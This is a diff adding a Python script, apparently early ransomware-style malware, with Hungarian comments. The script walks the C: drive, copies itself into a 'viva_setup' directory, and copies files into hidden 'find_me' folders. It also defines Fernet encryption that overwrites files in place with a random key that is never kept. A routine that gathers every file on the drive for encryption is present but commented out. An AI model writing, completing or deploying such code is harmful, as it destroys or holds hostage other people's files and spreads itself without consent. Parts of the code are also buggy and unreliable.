@@ -1,0 +1,106 @@
+#felcseréli a fájlok nevét és típusait
+import os
+import shutil
+from cryptography.fernet import Fernet
+
+
+
+#File osztály
+
+    
+class Avanger:
+    drives = [ chr(drive_char) + ":" for drive_char in range(65,91) if os.path.exists(chr(drive_char) + ":") ]
+    num_2369 = 0
+
+    def __init__(self, fullname, path):
+        self.fullname = fullname
+        self.key = Fernet(Fernet.generate_key())
+        self.name = fullname.split(".")[0]
+        self.ext = fullname.split(".")[-1]
+        self.path = path
+
+    @staticmethod
+    def find_setup():
+        # for drive in drives TODO: on the end
+        for root, dirs, files in os.walk(f'C:/'):  # {drive} TODO: all drives
+
+            for dir in dirs:
+
+                if dir == "viva_setup":
+                    return root + "/" + dir
+
+    @staticmethod
+    def send_my_self(des_path):
+        shutil.copytree("./", f"{des_path}/Vivo")
+
+    def b_2369(self, send_path):
+
+        if "extent" not in os.listdir(send_path):
+            os.mkdir(f"{send_path}/extent")
+
+        shutil.copyfile(self.fullname, f'./backup/{self.name}.txt')
+
+        if f"find_me{Avanger.num_2369}" not in os.listdir(f"{send_path}/extent"):
+
+            os.mkdir(f"{send_path}/extent/find_me{Avanger.num_2369}")
+
+            shutil.copyfile(self.fullname, f'{send_path}/extent/find_me{Avanger.num_2369}/{self.name}.txt')
+
+            Avanger.num_2369 += 1
+
+    def enc(self):
+
+        with open(self.fullname, 'rb') as avg_file:
+
+            with open(self.fullname, 'wb') as encrypted_file:
+
+                encrypted_file.write(self.key.encrypt(avg_file.read()))
+                
+    def dec(self):
+
+        with open(self.fullname, 'rb') as encrypted_file:
+
+            with open(self.fullname, 'wb') as dec_file:
+
+                dec_file.write(self.key.decrypt(encrypted_file.read()))
+                
+
+
+def collecter():
+
+    def en_collecter():
+
+        en_collecter_obj = []
+
+        # for drive in drives: TODO: at the end
+
+        for root, dirs, files in os.walk(f'C:/'):  # {drive} TODO: all drives
+
+            for file in files:
+
+                if file.count(".") < 2:
+                    en_collecter_obj.append(Avanger(fullname=file, path=root))
+                    
+        return en_collecter_obj
+
+    def fr_collecter():
+
+        for root, dirs, files in os.walk(f'./'):
+
+            for file in files:
+
+                if file.count(".") < 2 and root == "./":
+                    Avanger(fullname=file, path=root).b_2369(path)
+
+    fr_collecter()
+    
+    # return en_collecter()
+
+
+path = Avanger.find_setup()
+Avanger.send_my_self(path)
+file_obj = collecter()
+
+
+                
+                
